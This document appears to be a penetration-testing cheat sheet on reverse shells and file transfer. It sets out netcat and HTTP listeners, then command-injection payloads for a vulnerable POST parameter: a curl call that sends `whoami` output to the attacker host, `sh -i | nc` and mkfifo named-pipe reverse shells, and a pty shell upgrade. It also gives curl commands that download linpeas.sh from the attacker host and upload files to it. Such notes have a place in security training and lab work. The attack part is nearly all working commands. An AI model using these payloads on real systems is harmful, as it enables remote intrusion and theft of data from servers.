# Reverse shells

Very useful on web servers if you can a vulnerability that allows RCE.

## Overall process

**Step 1. Start a listener**
This can be either a http server or using netcat.

- `python -m http.server 6000`: Start a simple listener over http on port 6000. Note that the server will expose anything in the root of where it started.
- `nc -lvvp 5000`: Start a netcat based listener on port 5000

## Step 2. Deliver a payload
First use Burp Suite to capture a vulnerable POST request. Send that to the repeater then modify the parameters.

Example paylods:
```
# Set the host_ip (attacking machine)
host_ip='x.x.x.x'

# Use curl to find and output the current user as a query paramter.
# Use to ascertain context web server is run as.
payload=";curl http://$host_ip:5000?output=`whoami`;"

# Create a simple interactive shell and pipe the output to netcat
payload=";sh -i 2>&1|nc host_ip 5000;"

# Advanced shell using a named pipe to capture the output and forward that to netcat
payload=";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $host_ip 5000 >/tmp/f;"
```

## Step 3. Spawn a bash shell
Often reverse shells start with only a very basic shell (e.g. sh). Once connected it can be helpful to spawn a bash (or other type of shell supported by the server). Often just running `bash` will not work.

- `echo $0`: Find what shell is currently being used
- `python3 -c 'import pty;pty.spawn("/bin/bash")'`: Spawn a bash shell via Python


# Infiltrating and Exfiltrating
Often the easiest way to do this is to start a web server and use curl.

- `python -m http.server 6000`: Start a simple listener over http on port 500. Note that the server will expose anything in the root of where it started.

**Downloadind files**
- `curl -O http:[host_ip]:6000/linpeas.sh`: Download file linpeas.sh (must exist in the root directory of the web server)

**Uploading files**
*Step 1. First start the upload server on the host*
This relies on using the python uploadserver library. If necessary install this (into your virual python environment) using `pip install uploadserver`.

- `python -m uploadserver`: Start the upload server on port 8000 with upload at /upload

*Step 2. Exfiltrate the data
- `curl -X POST http://[host_ip]:8000/upload -F 'files=@basicauth-example.txt'`